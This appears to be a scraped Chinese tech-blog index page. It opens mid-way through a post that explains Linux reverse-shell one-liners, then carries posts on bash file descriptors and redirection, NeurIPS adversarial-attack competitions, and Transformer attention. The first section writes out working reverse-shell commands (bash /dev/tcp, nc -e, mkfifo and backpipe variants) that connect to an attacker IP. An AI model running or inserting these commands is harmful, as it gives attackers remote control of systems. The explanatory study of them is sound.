<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><strong>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句</strong></p>
<h2 id="0X04-常见的反弹shell-的语句怎么理解"><a href="#0X04-常见的反弹shell-的语句怎么理解" class="headerlink" title="0X04 常见的反弹shell 的语句怎么理解"></a><strong>0X04 常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>
<p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别（我在上面给出链接的文章中也特地用加粗的形式解释了）</p>
<h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
<p>示意图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173609-d004effc-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-97b543050b77919b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
<p><strong>简单的解释一下：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>
<p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure>
<p>这个是一个非常经典的句子，它的原句是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure>
<p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p>
<p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
<p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
<h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure>
<p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<p><strong>简单的解释：</strong></p>
<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
<p>类似的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
<h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>反弹shell方法虽然常见，方法网上一搜就是一大把的代码，但是很少有人会去仔细斟酌反弹shell的原理，我也看到有类似的文章，但是可能是由于篇幅原因并没有对文件描述符和重定向的部分做深入的讨论，导致解释语句的时候依然让人不好理解，于是这次我分成了两篇有所关联的文章彻底的剖析了一下，个人认为这个原理是非常值得大家思考的，也很有趣，如果我的文章有什么地方有问题，希望大家及时联系我。</p>
<h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a><br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><a href="https://blog.csdn.net/roler_/article/details/17504039" target="_blank" rel="noopener">https://blog.csdn.net/roler_/article/details/17504039</a><br><a href="http://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/153986.html</a><br><a href="https://www.zhihu.com/question/24503813" target="_blank" rel="noopener">https://www.zhihu.com/question/24503813</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/Linux反弹shell（一）文件描述符与重定向/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/23/Linux反弹shell（一）文件描述符与重定向/" itemprop="url">Linux反弹shell（一）文件描述符与重定向</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T18:15:08+08:00">
                2019-10-23
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/23/Linux反弹shell（一）文件描述符与重定向/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/23/Linux反弹shell（一）文件描述符与重定向/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.7k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>由于在反弹shell的过程中有一些精简的语句一直没有弄明白，今天特意写文章总结这里面最难的文件描述符和重定向的部分。</p>
<h2 id="0X01-文件描述符"><a href="#0X01-文件描述符" class="headerlink" title="0X01 文件描述符"></a><strong>0X01 文件描述符</strong></h2><blockquote>
<p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
</blockquote>
<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
<p>标准输入standard input ：0 （默认设备键盘）<br>标准输出standard output ：1（默认设备显示器）<br>错误输出：error output ：2（默认设备显示器）</p>
<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p>
<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），<font color="#dd0000">如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</font><br> </p>
<h2 id="0X02-重定向"><a href="#0X02-重定向" class="headerlink" title="0X02 重定向"></a><strong>0X02 重定向</strong></h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
<p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p>
<h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>1.<font color="#dd0000">bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令。</font><br> </p>
<p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
<p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p>
<p><strong>4.再强调一下，重定向就是针对文件描述符的操作</strong></p>
<h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p>
<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d749a4e2-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-42b270876953801a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d7566fc4-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-2226eb0bf1bc401f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>)</p>
<h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式： [n]&gt; word</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d774b3bc-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-d34e7ebf953430a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d77f7b1c-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-a5a7ebf73f3a10b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p>
<h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p>
<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d79df60a-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-68c48f0911232468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。</p>
<h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p>
<p>说明：</p>
<p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
<p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
<p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>
<p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p>
<h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
<p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p>
<p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p>
<p><strong>1.首先解析器解析到 2&gt;&amp;1</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7bcbb94-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-c2b066459c2d34f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>2.解析器再向后解析到 “&gt;”</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7cdb7be-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-7df46448185877e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><strong>每次都写”&gt;log 2&gt;&amp;1”太麻烦，能简写吗？</strong><br>有以下两种简写方式</p>
<p>&amp;&gt;log</p>
<blockquote>
<p>&amp;log<br>&amp;&gt;和&gt;&amp;语义上是没有任何区别的</p>
</blockquote>
<h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a><strong>5.exec 绑定重定向</strong></h3><p>格式：exec [n] &lt;/&gt; file/[n]</p>
<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
<h3 id="重点：-2"><a href="#重点：-2" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>格式： [n]&lt;&gt;word</p>
<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7da9894-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-a6eaa6255a84dc83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7e99074-9c80-1.png" target="_blank" rel="noopener"><img src="https://upload-images.jianshu.io/upload_images/4463968-ac67b0ab25efe489.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></a> </p>
<h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>文件描述符和重定向的作用巨大，很好的体现出了Linux中一切皆文件的特性，在反弹shell建立交互通道的过程中也起到了至关重要的作用。</p>
<h2 id="0X04-参考链接"><a href="#0X04-参考链接" class="headerlink" title="0X04 参考链接"></a><strong>0X04 参考链接</strong></h2><p><a href="https://blog.csdn.net/ccwwff/article/details/48519119" target="_blank" rel="noopener">https://blog.csdn.net/ccwwff/article/details/48519119</a><br><a href="http://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html" target="_blank" rel="noopener">http://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html</a><br><a href="http://www.178linux.com/54471" target="_blank" rel="noopener">http://www.178linux.com/54471</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/如何真正的薅AI Studio羊毛/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/23/如何真正的薅AI Studio羊毛/" itemprop="url">如何真正的薅AI Studio羊毛</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T10:45:08+08:00">
                2019-10-23
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/23/如何真正的薅AI Studio羊毛/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/23/如何真正的薅AI Studio羊毛/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  16字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>先占坑</p>
<p>Linux反弹shell（一）文件描述符与重定向</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/08/盘点 NeurIPS 两届神经网络对抗赛2017、2018/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/08/盘点 NeurIPS 两届神经网络对抗赛2017、2018/" itemprop="url">盘点 NeurIPS 两届神经网络对抗赛 (NIPS2017、NIPS2019）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-08T12:23:48+08:00">
                2019-07-08
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/07/08/盘点 NeurIPS 两届神经网络对抗赛2017、2018/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/08/盘点 NeurIPS 两届神经网络对抗赛2017、2018/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  17分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>本文包含两大部分：<br><strong>1、NIPS2017：神经网络太好骗？清华团队如何做到打NIPS攻防赛得3冠军的</strong></p>
<p>作者：张子豪</p>
<p>来源：<a href="https://mp.weixin.qq.com/s/P2FjJNb-Qw9SBQiDP_r0Kw" target="_blank" rel="noopener">人工智能头条</a></p>
<p>文章介绍了如何用对抗样本修改图片，误导神经网络指鹿为马；对 NIPS 2017 神经网络对抗攻防赛 3 项冠军清华团队的算法模型进行了解读。文章部分内容来自 2018 CNCC 中国计算机大会—人工智能与信息安全分会场报告。</p>
<p><strong>2、NIPS2018：NIPS 2018对抗视觉挑战赛结果公布：CMU邢波团队包揽两项冠军</strong></p>
<p>作者：Wieland Brendel</p>
<p>来源：<a href="https://mp.weixin.qq.com/s/DYUsUvE3oLp1zHH02Z4rZA" target="_blank" rel="noopener">机器之心</a></p>
<p>近日，NIPS 2018 对抗视觉挑战赛结果公布。CMU 邢波团队包揽两项冠军，另一项冠军则由来自加拿大的 LIVIA 团队斩获，清华 TSAIL 团队获得「无针对性攻击」的亚军。本文介绍了这些团队的方法大纲，不过具体细节将在 12 月 7 日 9:15–10:30 举办的 NIPS Competition 研讨会上揭晓。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/07/08/盘点 NeurIPS 两届神经网络对抗赛2017、2018/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/nlp中的Attention注意力机制+Transformer详解/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/22/nlp中的Attention注意力机制+Transformer详解/" itemprop="url">nlp中的Attention注意力机制+Transformer详解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-22T19:45:08+08:00">
                2019-04-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/04/22/nlp中的Attention注意力机制+Transformer详解/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/04/22/nlp中的Attention注意力机制+Transformer详解/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  3.2k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  11分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文以QA形式对自然语言处理中注意力机制（Attention）进行总结，并对Transformer进行深入解析。</p>
<p><strong>目录</strong></p>
<blockquote>
<p><strong>一、Attention机制剖析</strong><br>1、为什么要引入Attention机制？<br>2、Attention机制有哪些？（怎么分类？）<br>3、Attention机制的计算流程是怎样的？<br>4、Attention机制的变种有哪些？<br>5、一种强大的Attention机制：为什么自注意力模型（self-Attention model）在长距离序列中如此强大？<br>（1）卷积或循环神经网络难道不能处理长距离序列吗？<br>（2）要解决这种短距离依赖的“局部编码”问题，从而对输入序列建立长距离依赖关系，有哪些办法呢？<br>（3）自注意力模型（self-Attention model）具体的计算流程是怎样的呢?<br><strong>二、Transformer（Attention Is All You Need）详解</strong><br>1、Transformer的整体架构是怎样的？由哪些部分组成？<br>2、Transformer Encoder 与 Transformer Decoder 有哪些不同？<br>3、Encoder-Decoder attention 与self-attention mechanism有哪些不同？<br>4、multi-head self-attention mechanism具体的计算过程是怎样的？<br>5、Transformer在GPT和Bert等词向量预训练模型中具体是怎么应用的？有什么变化？</p>
</blockquote>
<h2 id="一、Attention机制剖析"><a href="#一、Attention机制剖析" class="headerlink" title="一、Attention机制剖析"></a><strong>一、Attention机制剖析</strong></h2><p><strong>1、为什么要引入Attention机制？</strong></p>
<p>根据通用近似定理，前馈网络和循环网络都有很强的能力。但为什么还要引入注意力机制呢？</p>
<ul>
<li><strong>计算能力的限制</strong>：当要记住很多“信息“，模型就要变得更复杂，然而目前计算能力依然是限制神经网络发展的瓶颈。</li>
<li><strong>优化算法的限制</strong>：虽然局部连接、权重共享以及pooling等优化操作可以让神经网络变得简单一些，有效缓解模型复杂度和表达能力之间的矛盾；但是，如循环神经网络中的长距离以来问题，信息“记忆”能力并不高。</li>
</ul>
<p><strong>可以借助人脑处理信息过载的方式，例如Attention机制可以提高神经网络处理信息的能力。</strong></p>
<p><strong>2、Attention机制有哪些？（怎么分类？）</strong></p>
